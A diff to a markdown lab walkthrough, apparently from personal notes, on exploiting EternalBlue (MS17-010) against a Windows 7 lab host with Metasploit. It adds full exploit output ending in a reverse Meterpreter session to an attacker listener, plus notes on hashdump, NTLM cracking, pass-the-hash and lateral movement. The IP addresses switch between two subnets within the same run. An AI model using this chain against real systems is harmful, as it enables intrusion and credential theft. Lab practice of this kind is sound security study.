@@ -135,7 +135,36 @@ exploit
 📉 Result:
 
 ```
-[*] Meterpreter session 2 opened
+[*] Started reverse TCP handler on 192.168.2.37:4444 
+[*] 192.168.2.38:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.2.38:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.2.38:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.2.38:445 - The target is vulnerable.
+[*] 192.168.2.38:445 - Connecting to target for exploitation.
+[+] 192.168.2.38:445 - Connection established for exploitation.
+[+] 192.168.2.38:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.2.38:445 - CORE raw buffer dump (38 bytes)
+[*] 192.168.2.38:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 192.168.2.38:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+[*] 192.168.2.38:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
+[+] 192.168.2.38:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.2.38:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.2.38:445 - Sending all but last fragment of exploit packet
+[*] 192.168.2.38:445 - Starting non-paged pool grooming
+[+] 192.168.2.38:445 - Sending SMBv2 buffers
+[+] 192.168.2.38:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.2.38:445 - Sending final SMBv2 buffers.
+[*] 192.168.2.38:445 - Sending last fragment of exploit packet!
+[*] 192.168.2.38:445 - Receiving response from exploit packet
+[+] 192.168.2.38:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.2.38:445 - Sending egg to corrupted connection.
+[*] 192.168.2.38:445 - Triggering free of corrupted buffer.
+[*] Sending stage (203846 bytes) to 192.168.178.38
+[*] Meterpreter session 1 opened (192.168.178.37:4444 -> 192.168.178.38:49158) at 2025-06-23 23:37:30 +0200
+[+] 192.168.2.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.2.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.2.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 ```
 
 ---
@@ -146,15 +175,7 @@ exploit
 * Hashdump + NTLM cracking is a fast route to further access
 * Even simple passwords like `Password123!` are still common
 * Pass-the-Hash and plaintext reuse are both viable
-
----
-
-## 📒 Suggested Notion Location
-
-```
-Labs > SMB Exploits > EternalBlue > win7-lab-walkthrough.md
-```
-
+* hashdump is not a windows commadn but a a Meterpreter command
 ---
 
 ✅ End of walkthrough — consider chaining to privilege escalation or lateral movement next.
